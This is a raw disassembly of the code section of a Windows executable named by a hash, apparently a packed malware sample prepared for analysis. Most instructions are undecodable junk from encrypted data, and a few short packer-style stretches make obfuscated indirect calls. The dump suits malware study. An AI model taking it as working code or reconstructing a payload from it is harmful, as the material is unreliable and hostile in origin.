
4515dad9c8b8b6b27147f484522f97533f3490b0e92deaf07ba8c8061e9269b2.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x20
  401006:	xor    ecx,DWORD PTR ds:0x42a775
  40100c:	jmp    0x4012ab
  401011:	(bad)  
  401012:	into   
  401013:	(bad)  
  401014:	rcr    edx,cl
  401016:	(bad)  
  401018:	aad    0xdf
  40101a:	mov    ebx,0x4cad0cf7
  40101f:	cli    
  401020:	mov    cl,0x78
  401022:	js     0x40109c
  401024:	js     0x401024
  401026:	jle    0x4010a0
  401028:	js     0x400ff2
  40102a:	xlat   BYTE PTR ds:[ebx]
  40102b:	cmp    eax,0xcfdbc1d5
  401030:	fld    st(6)
  401032:	pop    es
  401033:	push   es
  401034:	or     eax,DWORD PTR ds:0x3b080abb
  40103a:	bswap  edx
  40103c:	and    al,bh
  40103e:	sbb    bl,BYTE PTR [edi]
  401040:	inc    ecx
  401041:	bound  ecx,QWORD PTR [edx]
  401043:	mov    bh,0xdd
  401045:	or     bh,ch
  401047:	mov    ebp,0x880bd0e3
  40104c:	and    BYTE PTR [eax+0x1549a4f6],bh
  401052:	lods   eax,DWORD PTR ds:[esi]
  401053:	fadd   DWORD PTR [eax+0x1f]
  401056:	pusha  
  401057:	out    dx,al
  401058:	outs   dx,DWORD PTR ds:[esi]
  401059:	adc    ebx,DWORD PTR [ecx]
  40105b:	sahf   
  40105c:	add    dl,al
  40105e:	dec    edx
  40105f:	lods   al,BYTE PTR ds:[esi]
  401060:	pop    ebx
  401061:	sub    eax,0xad3ec6d9
  401066:	mov    WORD PTR [ebx],es
  401068:	lds    esi,FWORD PTR [ebx-0x76243a00]
  40106e:	adc    eax,0x3af3c19a
  401074:	xchg   ebx,eax
  401075:	icebp  
  401076:	dec    edi
  401077:	loopne 0x401019
  401079:	dec    ecx
  40107a:	call   DWORD PTR [edi-0x234ef85e]
  401080:	mov    ebp,0x5530ed4d
  401085:	sub    esi,DWORD PTR [esp+ebp*8+0x3be9868]
  40108c:	sbb    ebx,ecx
  40108e:	xchg   esp,eax
  40108f:	sub    esi,edx
  401091:	repz pop eax
  401093:	(bad)  
  401094:	out    0x42,al
  401096:	cli    
  401097:	in     al,dx
  401098:	xchg   esp,eax
  401099:	cmp    edi,ecx
  40109b:	jbe    0x401102
  40109d:	xlat   BYTE PTR ds:[ebx]
  40109e:	sub    cl,ch
  4010a0:	add    al,0xe1
  4010a2:	sbb    DWORD PTR [ecx-0x60],ebx
  4010a5:	xor    eax,0x2696f0b
  4010aa:	adc    bh,BYTE PTR [ecx]
  4010ac:	fisttp QWORD PTR [eax+0x7f753256]
  4010b2:	cmp    BYTE PTR [edi+0x13b0e30c],cl
  4010b8:	arpl   WORD PTR [ebp-0x23],dx
  4010bb:	rcl    BYTE PTR [ecx],1
  4010bd:	fistp  DWORD PTR [esi-0x1f]
  4010c0:	and    DWORD PTR [ecx-0x68],edi
  4010c3:	inc    eax
  4010c4:	push   ebx
  4010c5:	aaa    
  4010c6:	adc    eax,0x1c317733
  4010cb:	fstp   TBYTE PTR [eax]
  4010cd:	dec    edi
  4010ce:	repnz int 0xa6
  4010d1:	sti    
  4010d2:	cmp    dh,al
  4010d4:	jecxz  0x401114
  4010d6:	add    BYTE PTR [ebx-0x1dfe8b01],al
  4010dc:	mov    bl,0x9a
  4010de:	pop    ss
  4010df:	sub    eax,0xdd8e828c
  4010e4:	sub    dh,bl
  4010e6:	enter  0xf823,0x9c
  4010ea:	push   ecx
  4010eb:	jl     0x401079
  4010ed:	jo     0x40113e
  4010ef:	aas    
  4010f0:	(bad)  
  4010f1:	and    eax,edx
  4010f3:	outs   dx,BYTE PTR ds:[esi]
  4010f4:	stos   BYTE PTR es:[edi],al
  4010f5:	inc    esp
  4010f6:	mov    ebx,0x777ce8f7
  4010fb:	jge    0x401102
  4010fd:	repnz repz add eax,0x84e5e5cd
  401104:	mov    edx,0x90315908
  401109:	mov    ebp,0xcc6a3816
  40110e:	lock add dh,BYTE PTR gs:[ebx]
  401112:	add    al,0x9a
  401114:	(bad)
  401117:	adc    dl,0xe8
  40111a:	ficom  WORD PTR [ebp+0x5937d68a]
  401120:	daa    
  401121:	pop    ecx
  401122:	xchg   esp,eax
  401123:	mov    dh,0xe2
  401125:	pop    ebx
  401126:	fmul   QWORD PTR [ebx]
  401128:	jae    0x401115
  40112a:	mov    es,WORD PTR [edi-0x4fdda16]
  401130:	mov    dl,0x5
  401132:	loop   0x401133
  401134:	mov    BYTE PTR [ecx-0x2289edc],bh
  40113a:	sbb    ecx,DWORD PTR ds:0xc1e9f4b
  401140:	test   DWORD PTR [ecx-0x66],edx
  401143:	dec    eax
  401144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401145:	lds    edi,FWORD PTR [ebp+0x5ae6fee2]
  40114b:	cmc    
  40114c:	or     dl,dh
  40114e:	out    0x6f,al
  401150:	inc    ebp
  401151:	or     BYTE PTR [ecx+ecx*4],bh
  401154:	push   edx
  401155:	sbb    DWORD PTR [edi+0x4a68ee2],edi
  40115b:	pop    ebp
  40115c:	les    edi,FWORD PTR ds:[edx-0x23]
  401160:	sahf   
  401161:	add    eax,0x224f8023
  401166:	jmp    0xfc8f:0x46fcb9ed
  40116d:	lods   eax,DWORD PTR ds:[esi]
  40116e:	sbb    bh,BYTE PTR cs:[edx-0x4eb6c2e1]
  401175:	(bad)  
  401177:	add    DWORD PTR [ebp+0x7cb77334],esp
  40117d:	cld    
  40117e:	in     al,dx
  40117f:	or     dl,bh
  401181:	ss pop ebx
  401183:	cmp    bl,cl
  401185:	add    ebx,edi
  401187:	stos   DWORD PTR es:[edi],eax
  401188:	stos   BYTE PTR es:[edi],al
  401189:	sub    bl,BYTE PTR [ebp+eax*8-0x3c]
  40118d:	sbb    al,0x5b
  40118f:	sub    dh,BYTE PTR [edx]
  401191:	xor    dl,BYTE PTR ds:0x5b59beb5
  401197:	sbb    eax,ebp
  401199:	popf   
  40119a:	data16 in al,dx
  40119c:	mov    bh,0xe1
  40119e:	pushf  
  40119f:	das    
  4011a0:	push   cs
  4011a1:	push   ds
  4011a2:	icebp  
  4011a3:	out    0xaf,al
  4011a5:	test   al,0x70
  4011a7:	xchg   ecx,eax
  4011a8:	addr16 in eax,dx
  4011aa:	fnsave [ebx-0x7d]
  4011ad:	mov    al,ds:0xd595d384
  4011b2:	fucomi st,st(6)
  4011b4:	or     bh,dl
  4011b6:	jo     0x4011ab
  4011b8:	xor    BYTE PTR ds:0x583eb9d3,0xd6
  4011bf:	aaa    
  4011c0:	xchg   DWORD PTR [edx+0x1b1c1fec],esi
  4011c6:	mov    eax,ds:0xce9e1bc0
  4011cb:	(bad)  
  4011cd:	int3   
  4011ce:	or     ah,al
  4011d0:	std    
  4011d1:	jne    0x4011db
  4011d3:	(bad)  
  4011d5:	dec    eax
  4011d6:	dec    ebp
  4011d7:	jns    0x401243
  4011d9:	or     ecx,DWORD PTR [eax+0x16]
  4011dc:	rcr    DWORD PTR [ebp-0x1e],0xc4
  4011e0:	clc    
  4011e1:	and    eax,0xf5f9500d
  4011e6:	jne    0x4011b7
  4011e8:	leave  
  4011e9:	sbb    BYTE PTR [esi],0x14
  4011ec:	popa   
  4011ed:	xor    al,0x7a
  4011ef:	and    DWORD PTR [esi],ebx
  4011f1:	adc    al,al
  4011f3:	stc    
  4011f4:	dec    esp
  4011f5:	shl    DWORD PTR cs:[ecx-0xc],1
  4011f9:	ss adc ch,ah
  4011fc:	dec    dx
  4011fe:	adc    eax,0xd0638645
  401203:	jmp    0x4011b0
  401205:	outs   dx,DWORD PTR ds:[esi]
  401206:	nop
  401207:	jnp    0x40120f
  401209:	mov    esp,DWORD PTR [ebx+0x43]
  40120c:	mov    dl,0x78
  40120e:	daa    
  40120f:	ret    0xe096
  401212:	lea    edi,[edx+0x63]
  401215:	mov    ds:0x58a6361d,al
  40121a:	and    bh,BYTE PTR [esi+0x43]
  40121d:	jo     0x401264
  40121f:	rcr    BYTE PTR [eax],cl
  401221:	in     eax,dx
  401222:	call   FWORD PTR [edx]
  401224:	sub    BYTE PTR [ebx-0x4a],bl
  401227:	adc    al,0xb9
  401229:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40122a:	mov    esp,DWORD PTR [edi-0x64]
  40122d:	pop    edi
  40122e:	hlt    
  40122f:	pop    ds
  401230:	call   0x724b:0xd924f7cd
  401237:	test   BYTE PTR [esi],dl
  401239:	int    0x21
  40123b:	mov    ebp,0x6a3615b
  401240:	mov    esp,0x311062e9
  401245:	aaa    
  401246:	(bad)  
  401247:	out    dx,eax
  401248:	adc    BYTE PTR [ebx],ah
  40124a:	xor    dh,ah
  40124c:	shl    ebp,0x64
  40124f:	mov    esp,DWORD PTR [eax+0x39]
  401252:	arpl   bx,ax
  401254:	adc    bl,BYTE PTR [esp+esi*8-0x2cb7d873]
  40125b:	xchg   esp,eax
  40125c:	test   ebx,esi
  40125e:	in     eax,0xa8
  401260:	adc    DWORD PTR [esi],eax
  401262:	jge    0x4012d4
  401264:	sub    al,0x6a
  401266:	nop
  401267:	inc    edx
  401268:	inc    ebp
  401269:	mov    edx,ss
  40126b:	lahf   
  40126c:	xchg   ebp,eax
  40126d:	or     DWORD PTR ds:0xd9258551,esp
  401273:	call   0x97d1:0x28681112
  40127a:	jp     0x401290
  40127c:	test   DWORD PTR ds:0x7b2c2bc9,ebx
  401282:	sbb    BYTE PTR [eax+ebp*4+0x78],bh
  401286:	sbb    edx,DWORD PTR [edi-0x3b3f9c48]
  40128c:	mov    eax,0x8be372f
  401291:	sub    BYTE PTR [esi-0x78],al
  401294:	cmp    al,0x9c
  401296:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401297:	sbb    ah,BYTE PTR [eax+0x21ce3a20]
  40129d:	in     eax,dx
  40129e:	fist   WORD PTR [esi]
  4012a0:	cmp    eax,0x2d40112c
  4012a5:	push   ebx
  4012a6:	push   es
  4012a7:	cmc    
  4012a8:	pop    ds
  4012a9:	jno    0x4012ea
  4012ab:	mov    eax,ds:0x41eae6
  4012b0:	xor    DWORD PTR ds:0x42a80d,edx
  4012b6:	mov    eax,DWORD PTR [eax+0x198]
  4012bc:	mov    ecx,DWORD PTR ds:0x42a7c1
  4012c2:	or     DWORD PTR ds:0x42a76d,ecx
  4012c8:	mov    DWORD PTR [ebp-0x8],eax
  4012cb:	mov    DWORD PTR ds:0x42a75d,0x436b
  4012d5:	mov    eax,DWORD PTR [ebp+0x8]
  4012d8:	mov    ecx,DWORD PTR [ebp-0x8]
  4012db:	push   ebx
  4012dc:	or     DWORD PTR ds:0x42a7c1,edx
  4012e2:	push   esi
  4012e3:	add    esi,DWORD PTR ds:0x42a7b5
  4012e9:	mov    esi,0x7510850
  4012ee:	and    ebx,0x1c58
  4012f4:	xor    eax,esi
  4012f6:	and    DWORD PTR ds:0x42a839,0x0
  401300:	jmp    0x401312
  401305:	mov    ebx,DWORD PTR ds:0x42a839
  40130b:	inc    ebx
  40130c:	mov    DWORD PTR ds:0x42a839,ebx
  401312:	cmp    DWORD PTR ds:0x42a839,0x11
  401319:	jae    0x401344
  40131f:	cmp    DWORD PTR ds:0x42a839,0x16
  401326:	jne    0x401335
  40132c:	push   DWORD PTR [ebp-0x1c]
  40132f:	call   DWORD PTR ds:0x41d180
  401335:	jmp    0x401305
  40133a:	adc    DWORD PTR ds:0x42a781,0x42a805
  401344:	push   edi
  401345:	and    DWORD PTR ds:0x42a809,0x0
  40134f:	jmp    0x401361
  401354:	mov    edi,DWORD PTR ds:0x42a809
  40135a:	inc    edi
  40135b:	mov    DWORD PTR ds:0x42a809,edi
  401361:	cmp    DWORD PTR ds:0x42a809,0x1d
  401368:	jae    0x4013a9
  40136e:	cmp    DWORD PTR ds:0x42a809,0xe
  401375:	jne    0x401384
  40137b:	push   DWORD PTR [ebp-0x10]
  40137e:	call   DWORD PTR ds:0x41d0b4
  401384:	cmp    DWORD PTR ds:0x42a809,0xd
  40138b:	jne    0x40139e
  401391:	mov    edi,DWORD PTR ds:0x42a809
  401397:	inc    edi
  401398:	mov    DWORD PTR ds:0x42a809,edi
  40139e:	jmp    0x401354
  4013a3:	sub    DWORD PTR ds:0x42a7b5,edx
  4013a9:	mov    edi,0x327298
  4013ae:	mov    DWORD PTR ds:0x42a76d,0x11
  4013b8:	cmp    DWORD PTR ds:0x42a76d,0x0
  4013bf:	je     0x4016af
  4013c5:	cmp    DWORD PTR ds:0x42a76d,0x2
  4013cc:	jne    0x4013e4
  4013d2:	push   0x42a7b5
  4013d7:	push   0x0
  4013d9:	push   0x42a9cd
  4013de:	call   DWORD PTR ds:0x41d0b8
  4013e4:	cmp    DWORD PTR ds:0x42a76d,0x3
  4013eb:	jne    0x4013fe
  4013f1:	mov    ebx,DWORD PTR ds:0x42a76d
  4013f7:	dec    ebx
  4013f8:	mov    DWORD PTR ds:0x42a76d,ebx
  4013fe:	mov    ebx,DWORD PTR ds:0x42a76d
  401404:	dec    ebx
  401405:	mov    DWORD PTR ds:0x42a76d,ebx
  40140b:	jmp    0x4013b8
  401410:	jmp    0x4016af
  401415:	leave  
  401416:	rol    dh,0xcf
  401419:	leave  
  40141a:	int    0xd9
  40141c:	fimul  DWORD PTR [edx]
  40141e:	leave  
  40141f:	rcl    BYTE PTR [ecx-0x35],1
  401422:	test   al,0x99
  401424:	jb     0x401424
  401426:	jle    0x4014a0
  401428:	js     0x401428
  40142a:	jle    0x4014a4
  40142c:	js     0x40145b
  40142e:	xor    dl,BYTE PTR [esi+0x5e]
  401431:	(bad)  
  401432:	clc    
  401433:	cmp    ch,dl
  401435:	push   ecx
  401436:	cmc    
  401437:	test   eax,0xa5648d7c
  40143c:	call   DWORD PTR [ecx-0x12]
  40143f:	mov    WORD PTR [edx],?
  401441:	inc    ecx
  401442:	call   0xf115:0xc0853ba4
  401449:	inc    edi
  40144a:	and    ah,ch
  40144c:	ja     0x401478
  40144e:	shl    esi,cl
  401450:	and    ebx,ecx
  401452:	cdq    
  401453:	adc    ch,dh
  401455:	mov    esi,0xb9b260bb
  40145a:	jle    0x401416
  40145c:	leave  
  40145d:	jmp    0x401464
  40145f:	xor    al,0x81
  401461:	xor    DWORD PTR [ebp+0x5f6fdde3],ecx
  401467:	popa   
  401468:	xchg   esp,eax
  401469:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40146a:	mov    ds:0x3f4732ef,eax
  40146f:	xchg   esi,eax
  401470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401471:	sbb    edi,DWORD PTR [edi-0x5e]
  401474:	(bad)  
  401475:	adc    ch,BYTE PTR [edx+ebx*8+0x55]
  401479:	aas    
  40147a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40147b:	jmp    FWORD PTR [edx-0xede3191]
  401481:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401482:	rcr    DWORD PTR [ebp+0x69],1
  401485:	push   ebx
  401486:	xchg   edi,eax
  401487:	push   edi
  401488:	adc    BYTE PTR [eax+ebp*4+0x17],0xac
  40148d:	(bad)  
  40148e:	nop
  40148f:	jmp    0xfb76:0xa6d9fe01
  401496:	mov    edi,0xb28c8e61
  40149b:	(bad)
  40149f:	test   BYTE PTR [ebx+0x475ac67a],0xcc
  4014a6:	dec    eax
  4014a7:	into   
  4014a8:	or     eax,0x854ee254
  4014ad:	xor    al,0x75
  4014af:	jno    0x401459
  4014b1:	out    0x89,al
  4014b3:	push   edx
  4014b4:	push   edi
  4014b5:	test   eax,0x4f642b4a
  4014ba:	sbb    eax,0x6713f61b
  4014bf:	ja     0x401445
  4014c1:	mov    ebx,0x7868ad76
  4014c6:	jmp    0x276b90f3
  4014cb:	jmp    0xff80:0x8c6380a6
  4014d2:	xchg   ecx,eax
  4014d3:	pop    ds
  4014d4:	fisttp QWORD PTR [edx]
  4014d6:	mov    cl,0xdb
  4014d8:	cmp    al,0x72
  4014da:	inc    esp
  4014db:	in     al,dx
  4014dc:	push   es
  4014dd:	fimul  WORD PTR [edx+0x25]
  4014e0:	fs clc 
  4014e2:	sbb    BYTE PTR [edi],cl
  4014e4:	inc    edx
  4014e5:	pop    ds
  4014e6:	adc    bh,BYTE PTR [ecx-0x45]
  4014e9:	sub    eax,0xa5f3b878
  4014ee:	test   BYTE PTR [edi],cl
  4014f0:	mov    ebp,DWORD PTR [ebx+eiz*2+0x1a]
  4014f4:	mov    ah,cl
  4014f6:	rol    DWORD PTR [ecx-0x7],1
  4014f9:	inc    edx
  4014fa:	xchg   ebx,eax
  4014fb:	inc    edi
  4014fc:	push   esp
  4014fd:	mov    edi,0x74a0d49
  401502:	daa    
  401503:	jmp    0x401558
  401505:	mov    edi,DWORD PTR [edi]
  401507:	(bad)  
  401508:	ja     0x4014ba
  40150a:	jmp    0xe5b33c77
  40150f:	outs   dx,DWORD PTR ds:[esi]
  401510:	test   al,0x1e
  401512:	xchg   ebp,eax
  401513:	lea    ecx,[esi+0x14]
  401516:	ds inc edx
  401518:	sub    cl,BYTE PTR [eax-0x32]
  40151b:	into   
  40151c:	cli    
  40151d:	adc    eax,0x6f242321
  401522:	push   ss
  401523:	outs   dx,BYTE PTR ds:[esi]
  401524:	cmp    dh,BYTE PTR ds:0x3c5d8e62
  40152a:	mov    eax,ebp
  40152c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40152d:	adc    bl,dl
  40152f:	push   ss
  401530:	fucomp st(0)
  401532:	ret    
  401533:	in     eax,dx
  401534:	int    0x20
  401536:	add    cl,BYTE PTR [ebx]
  401538:	ins    BYTE PTR es:[edi],dx
  401539:	fdiv   QWORD PTR [edi+0x672a98d5]
  40153f:	scas   al,BYTE PTR es:[edi]
  401540:	xor    BYTE PTR [edx+esi*2],bh
  401543:	mov    al,0x58
  401545:	stos   DWORD PTR es:[edi],eax
  401546:	sti    
  401547:	xor    BYTE PTR [ebx+0xb],al
  40154a:	jnp    0x401550
  40154c:	and    eax,DWORD PTR [ebx]
  40154e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40154f:	ins    DWORD PTR es:[edi],dx
  401550:	cs aam 0x1
  401553:	aaa    
  401554:	ss in  eax,dx
  401556:	cs cld 
  401558:	push   cs
  401559:	push   0x4446e57a
  40155e:	jns    0x4015d5
  401560:	xchg   esp,eax
  401561:	js     0x401523
  401563:	mov    al,ds:0xbebef672
  401568:	push   ebx
  401569:	iret   
  40156a:	mov    DWORD PTR [ebx-0x65767d3f],0xf497d60
  401574:	add    al,0x46
  401576:	add    ebx,DWORD PTR [ebx]
  401578:	in     eax,0x12
  40157a:	or     ah,BYTE PTR [ebx-0x47dd7a8d]
  401580:	lock mov DWORD PTR [esi],ecx
  401583:	out    dx,al
  401584:	pop    ss
  401585:	push   edx
  401586:	jle    0x401526
  401588:	stos   DWORD PTR es:[edi],eax
  401589:	lea    ebx,[esi]
  40158b:	jp     0x401596
  40158d:	or     ch,dl
  40158f:	es mov ch,0x73
  401592:	out    0x87,al
  401594:	(bad)  
  401595:	pop    eax
  401596:	imul   ebx,DWORD PTR ds:0x9052fcf4,0x8d752eeb
  4015a0:	xchg   DWORD PTR [edx],edi
  4015a2:	sub    al,0xd7
  4015a4:	arpl   di,di
  4015a6:	sar    DWORD PTR [esi-0x58],cl
  4015a9:	das    
  4015aa:	mov    ds:0xc421d949,eax
  4015af:	sub    eax,0xb5093c2f
  4015b4:	jns    0x4015fa
  4015b6:	xchg   edi,eax
  4015b7:	mul    DWORD PTR [ebp+0x74]
  4015ba:	xchg   ebp,eax
  4015bb:	in     eax,dx
  4015bc:	(bad)  
  4015bd:	out    dx,al
  4015be:	pop    edx
  4015bf:	js     0x40156c
  4015c1:	dec    DWORD PTR [ecx-0x26]
  4015c4:	push   es
  4015c5:	repz sub eax,0xa778b76c
  4015cb:	pop    es
  4015cc:	je     0x401623
  4015ce:	hlt    
  4015cf:	adc    BYTE PTR [eax-0x20a79cd3],bl
  4015d5:	out    dx,eax
  4015d6:	std    
  4015d7:	xor    esp,ebx
  4015d9:	push   ss
  4015da:	add    ah,BYTE PTR [ebx+0x1e]
  4015dd:	and    ebx,ebp
  4015df:	inc    edx
  4015e0:	bound  edx,QWORD PTR [edi+0x44]
  4015e3:	out    dx,eax
  4015e4:	cmp    eax,0xbfbf4354
  4015e9:	sbb    bl,BYTE PTR [edi+0x120ac62b]
  4015ef:	out    dx,eax
  4015f0:	imul   BYTE PTR [edx*8+0x4b6ee525]
  4015f7:	inc    ebp
  4015f8:	mov    ebx,DWORD PTR [edx-0x9]
  4015fb:	arpl   WORD PTR [ebx-0x53],dx
  4015fe:	jle    0x4015b2
  401600:	daa    
  401601:	arpl   WORD PTR [eax],cx
  401603:	mov    bh,0x7
  401605:	jg     0x4015ea
  401607:	jecxz  0x401666
  401609:	mov    cl,0x52
  40160b:	(bad)  
  40160c:	out    0x42,al
  40160e:	js     0x40168a
  401610:	adc    al,0xdb
  401612:	pop    eax
  401613:	mov    al,ds:0x169f4ce9
  401618:	jg     0x4015b2
  40161a:	ret    
  40161b:	jg     0x401606
  40161d:	call   0xacf54915
  401622:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401624:	jp     0x401604
  401626:	xchg   edi,eax
  401627:	shl    BYTE PTR [ebx-0x44],1
  40162a:	icebp  
  40162b:	ds cmc 
  40162d:	ret    
  40162e:	(bad)  
  40162f:	mov    edi,0xcee9388a
  401634:	sbb    BYTE PTR [edi],0x6c
  401637:	push   0xffffffd4
  401639:	push   es
  40163a:	mov    dh,0x23
  40163c:	ja     0x4015db
  40163e:	pop    ds
  40163f:	nop
  401640:	dec    esp
  401641:	or     ah,ah
  401643:	les    esp,FWORD PTR [edx*1-0x2f3820e5]
  40164a:	dec    eax
  40164b:	cdq    
  40164c:	sbb    al,0x82
  40164e:	xor    eax,0x4f228c36
  401653:	loopne 0x4016c4
  401655:	cmp    esp,DWORD PTR [ebp-0x338b4cee]
  40165b:	mov    cl,0x76
  40165d:	push   0xffffffd3
  40165f:	cmp    al,0x87
  401661:	mov    edx,0xfabc0aec
  401666:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401667:	addr16 pop esi
  401669:	push   esi
  40166a:	sbb    dh,BYTE PTR [esi+0x3a90aefc]
  401670:	not    BYTE PTR [edx]
  401672:	or     DWORD PTR [ecx-0x56],esi
  401675:	inc    esi
  401676:	into   
  401677:	adc    DWORD PTR [esi+0x53eb1589],0xea3b2a00
  401681:	call   0x46b9:0x98150f27
  401688:	mov    ch,0x84
  40168a:	ds mov edi,esp
  40168d:	xchg   esp,eax
  40168e:	fwait
  40168f:	push   esi
  401690:	pop    ss
  401691:	jb     0x401693
  401693:	mov    bh,0x94
  401695:	jmp    0x4016af
  401697:	popa   
  401698:	out    0x3e,eax
  40169a:	fcom   DWORD PTR [esi+0x17]
  40169d:	loope  0x40170a
  40169f:	sbb    BYTE PTR [edx+0x6c],0x21
  4016a3:	pop    ebx
  4016a4:	cdq    
  4016a5:	stos   WORD PTR es:[edi],ax
  4016a7:	call   0x2c1e0618
  4016ac:	inc    esp
  4016ad:	pop    ebx
  4016ae:	mov    ebp,0x3581c703
  4016b3:	dec    ebp
  4016b4:	test   al,0x42
  4016b6:	add    ah,bl
  4016b8:	push   ebx
  4016b9:	add    BYTE PTR [eax],al
  4016bb:	mov    DWORD PTR [ecx],eax
  4016bd:	adc    DWORD PTR ds:0x42a7b9,edi
  4016c3:	lea    eax,[ebp-0x4]
  4016c6:	or     DWORD PTR ds:0x42a769,0x42a75d
  4016d0:	mov    DWORD PTR [ebp-0x10],eax
  4016d3:	xor    DWORD PTR ds:0x42a76d,ebx
  4016d9:	mov    eax,DWORD PTR [ebp+0x8]
  4016dc:	neg    ecx
  4016de:	mov    ecx,DWORD PTR [ebp-0x10]
  4016e1:	xor    eax,esi
  4016e3:	jmp    0x401982
  4016e8:	ret    0x3dc5
  4016eb:	ret    
  4016ec:	leave  
  4016ed:	retf   
  4016ee:	ret    0xebc5
  4016f1:	out    0x4b,eax
  4016f3:	repz mov dh,0xb2
  4016f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4016f7:	mov    cl,0x7c
  4016f9:	add    edi,DWORD PTR [eax+0x78]
  4016fc:	(bad)  
  4016fd:	jle    0x401777
  4016ff:	js     0x4016ba
  401701:	dec    edx
  401702:	loope  0x40173d
  401704:	ins    BYTE PTR es:[edi],dx
  401705:	jge    0x4016af
  401707:	(bad)  
  401708:	mov    esp,0x63770e23
  40170d:	sub    ch,ch
  40170f:	addr16 icebp 
  401711:	or     BYTE PTR [esi-0xa],ch
  401714:	pop    ebp
  401715:	mov    al,0xa4
  401717:	or     ah,bl
  401719:	mov    edi,0x7a7434f8
  40171e:	stos   BYTE PTR es:[edi],al
  40171f:	out    dx,eax
  401720:	mov    al,ds:0xd97ccf4a
  401725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401726:	(bad)  
  401727:	or     al,BYTE PTR [ecx+0x2b41b916]
  40172d:	cmp    edx,DWORD PTR [esi-0x73]
  401730:	mov    eax,0xf2f570ed
  401735:	out    0x4c,eax
  401737:	cmp    eax,0xd198ef3e
  40173c:	jno    0x4016e7
  40173e:	ret    
  40173f:	sbb    DWORD PTR [ecx+0x45],esi
  401742:	xor    al,BYTE PTR [ebx-0x58]
  401745:	xchg   esp,eax
  401746:	xchg   ecx,eax
  401747:	jp     0x401763
  401749:	mov    BYTE PTR [ebp+0x3945f6e4],cl
  40174f:	push   es
  401750:	loop   0x401735
  401752:	lds    esp,FWORD PTR [edi+0xb]
  401755:	jno    0x401799
  401757:	cmp    DWORD PTR [esi+ebx*1],esp
  40175a:	call   0x24b7:0xb7c5634f
  401761:	lods   eax,DWORD PTR ds:[esi]
  401762:	mov    al,ds:0xad992a5b
  401767:	and    bl,BYTE PTR [edx-0x4d]
  40176a:	test   BYTE PTR [ebx-0x52237752],bh
  401770:	cmc    
  401771:	jmp    0x76dc:0x742609d8
  401778:	sub    ch,BYTE PTR [edi+0x7e]
  40177b:	(bad)  
  40177d:	inc    ebp
  40177e:	lods   al,BYTE PTR ds:[esi]
  40177f:	mov    ah,0x95
  401781:	add    ebp,esi
  401783:	or     DWORD PTR [esi],0x22b89e36
  401789:	mov    eax,0xc9015c32
  40178e:	mov    ss,ecx
  401790:	sbb    eax,0x64050875
  401795:	daa    
  401796:	mov    ds:0x9a81ad2f,eax
  40179b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40179c:	std    
  40179d:	call   0x7ed5b72b
  4017a2:	pop    esp
  4017a3:	mov    WORD PTR [edx],es
  4017a5:	outs   dx,DWORD PTR ds:[esi]
  4017a6:	inc    eax
  4017a7:	add    dh,BYTE PTR [ebx]
  4017a9:	mov    ebx,0xc588b15b
  4017ae:	test   BYTE PTR [esi+0x59],cl
  4017b1:	loop   0x4017d8
  4017b3:	cmp    ebp,DWORD PTR [edi]
  4017b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4017b6:	mov    cl,0x6e
  4017b8:	loopne 0x4017f3
  4017ba:	in     al,0x9e
  4017bc:	mov    ds,WORD PTR [ecx-0x2c8644e0]
  4017c2:	jb     0x4017ea
  4017c4:	mov    ah,0xb3
  4017c6:	inc    edx
  4017c7:	mov    dh,0xac
  4017c9:	xchg   esp,eax
  4017ca:	fdivr  st(0),st
  4017cc:	pop    es
  4017cd:	mov    DWORD PTR [ecx+0xdfb1df3],ecx
  4017d3:	or     BYTE PTR [ecx],cl
  4017d5:	mov    dl,0xa2
  4017d7:	cmp    esp,DWORD PTR [esi+esi*2+0x591fa8f7]
  4017de:	add    edx,DWORD PTR [edi+0x25077568]
  4017e4:	push   ecx
  4017e5:	jns    0x40178d
  4017e7:	mov    ds:0xfd98a44d,eax
  4017ec:	scas   eax,DWORD PTR es:[edi]
  4017ed:	cmp    al,0x8
  4017ef:	cwde   
  4017f0:	mov    dh,0x54
  4017f2:	sbb    bl,BYTE PTR [ebx+0x4]
  4017f5:	push   ecx
  4017f6:	pop    es
  4017f7:	or     DWORD PTR [edi],esp
  4017f9:	mov    DWORD PTR [ecx-0x2f],edi
  4017fc:	pop    eax
  4017fd:	pop    esp
  4017fe:	pop    eax
  4017ff:	sub    al,0xc5
  401801:	ret    0x144a
  401804:	push   eax
  401805:	mov    fs,WORD PTR [ebx-0x31d0117c]
  40180b:	jmp    0x4017c0
  40180d:	mov    ebx,0xe341fe23
  401812:	out    dx,eax
  401813:	and    al,0x7c
  401815:	pop    eax
  401816:	call   0xda13a5f2
  40181b:	xchg   esi,ebx
  40181d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40181e:	mov    esi,0x868ea8b5
  401823:	daa    
  401824:	and    DWORD PTR [edx+0x2826859f],0x46
  40182b:	rcr    DWORD PTR [esi+0x2bbfb77c],cl
  401831:	inc    ecx
  401832:	sar    esi,0xb2
  401835:	addr16 pop ecx
  401837:	lods   al,BYTE PTR ds:[esi]
  401838:	nop
  401839:	lods   al,BYTE PTR ds:[esi]
  40183a:	jo     0x401875
  40183c:	int    0x64
  40183e:	xlat   BYTE PTR ds:[ebx]
  40183f:	mul    DWORD PTR [ebp+0x7]
  401842:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401843:	pusha  
  401844:	test   eax,0x5eb8ebde
  401849:	test   eax,0xf729b577
  40184e:	mov    ds:0x69c9f405,al
  401853:	xchg   ecx,eax
  401854:	sahf   
  401855:	jge    0x401884
  401857:	rcl    BYTE PTR [esi-0x338e4d91],0x27
  40185e:	mov    bh,0x95
  401860:	loope  0x401800
